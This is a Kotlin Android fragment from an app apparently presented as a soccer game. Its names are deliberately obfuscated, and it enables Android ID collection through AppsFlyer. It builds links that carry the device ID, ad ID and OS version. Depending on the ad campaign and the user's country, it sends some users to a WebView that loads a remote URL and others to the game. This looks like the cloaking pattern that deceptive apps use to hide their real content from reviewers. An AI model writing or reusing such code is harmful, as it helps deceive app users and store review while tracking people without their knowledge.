package com.generamobile.headsoccerl

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import com.appsflyer.AppsFlyerLib
import com.generamobile.headsoccerl.gaaamamme.GaaamamamamamamaActivity
import com.generamobile.headsoccerl.otththther.VevVevVeeeebActivity
import com.my.tracker.MyTracker
import com.onesignal.OneSignal
import org.json.JSONException
import org.json.JSONObject
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class FiiiiiiiiiiiveeeeeesFragment : Fragment() {
    private lateinit var gthyhyhyyh: Context
    val bgnhnhhnnh: SharedPreferences by inject(named("SharedPreferences"))

    override fun onAttach(rgtgthyhyyhhy: Context) {
        super.onAttach(rgtgthyhyyhhy)
        gthyhyhyyh = rgtgthyhyyhhy
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_fiiiiiiiiiiiveeeeees, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val bgbghyhy = bgnhnhhnnh.getString("countryDev", null)
        val jukikolol = bgnhnhhnnh.getString("apps", null)
        val tghyhyhyhy = bgnhnhhnnh.getString("country", null)
        val bhnyhyhhy = bgnhnhhnnh.getString("appCamp", null)
        val dedefrftg = bgnhnhhnnh.getString("deepSt", null)
        val vffrgtgtg = bgnhnhhnnh.getString("wv", null)
        val sededeede = bgnhnhhnnh.getString("mainId", null)
        val ghyhyhyhhy = "com.generamobile.headsoccerl"
        val thyhyhyh = Build.VERSION.RELEASE
        val yhykypoyhpkhy = MyTracker.getTrackerParams()
        yhykypoyhpkhy.customUserId = sededeede
        val yhyhy26: String? = bgnhnhhnnh.getString("instId", null)

        val hyujuju62j = Intent(gthyhyhyyh, VevVevVeeeebActivity::class.java)
        val hyhy2juj5ju = Intent(gthyhyhyyh, GaaamamamamamamaActivity::class.java)

        val gthyhy = "deviceID="
        val veftghy = "sub_id_1="
        val jukikilolo = "ad_id="
        val bggttgyjuj = "sub_id_4="
        val juki2k2i = "sub_id_5="
        val ju2j2uj6 = "sub_id_6="
        val nh2n2u2juj5u = "naming"
        val hy2juj6 = "deeporg"

        val frgtgthhy = AppsFlyerLib.getInstance().getAppsFlyerUID(gthyhyhyyh)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        pushToOS(sededeede.toString())


        val hy2hy26y =
            "$vffrgtgtg$veftghy$bhnyhyhhy&$gthyhy$frgtgthhy&$jukikilolo$sededeede&$bggttgyjuj$ghyhyhyhhy&$juki2k2i$thyhyhyh&$ju2j2uj6$nh2n2u2juj5u"
        val hyhyyh9 =
            "$vffrgtgtg$gthyhy$sededeede&$jukikilolo$yhyhy26&$bggttgyjuj$ghyhyhyhhy&$juki2k2i$thyhyhyh&$ju2j2uj6$nh2n2u2juj5u"
        val hy2hy5hy9 =
            "$vffrgtgtg$veftghy$dedefrftg&$gthyhy$frgtgthhy&$jukikilolo$sededeede&$bggttgyjuj$ghyhyhyhhy&$juki2k2i$thyhyhyh&$ju2j2uj6$hy2juj6"
        val h2hy5yhyh59 =
            "$vffrgtgtg$veftghy$dedefrftg&$gthyhy$sededeede&$jukikilolo$yhyhy26&$bggttgyjuj$ghyhyhyhhy&$juki2k2i$thyhyhyh&$ju2j2uj6$hy2juj6"

        when (jukikolol) {
            "1" ->
                if (bhnyhyhhy != "null") {
                    bgnhnhhnnh.edit().putString("link", hy2hy26y).apply()
                    startActivity(hyujuju62j)
                    activity?.finish()
                } else if (dedefrftg != null || bgbghyhy!!.contains(tghyhyhyhy.toString())) {
                    bgnhnhhnnh.edit().putString("link", hy2hy5hy9).apply()
                    startActivity(hyujuju62j)
                    activity?.finish()
                } else {
                    startActivity(hyhy2juj5ju)
                    activity?.finish()
                }
            "0" ->
                if (dedefrftg != null) {
                    bgnhnhhnnh.edit().putString("link", h2hy5yhyh59).apply()
                    startActivity(hyujuju62j)
                    activity?.finish()
                } else if (bgbghyhy!!.contains(tghyhyhyhy.toString())) {
                    bgnhnhhnnh.edit().putString("link", hyhyyh9).apply()
                    startActivity(hyujuju62j)
                    activity?.finish()
                } else {
                    startActivity(hyhy2juj5ju)
                    activity?.finish()
                }
        }
    }

    private fun pushToOS(id: String) {
        OneSignal.setExternalUserId(
            id,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {

                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val isPushSuccess = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $isPushSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val isEmailSuccess =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $isEmailSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val isSmsSuccess = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $isSmsSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {

                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }
}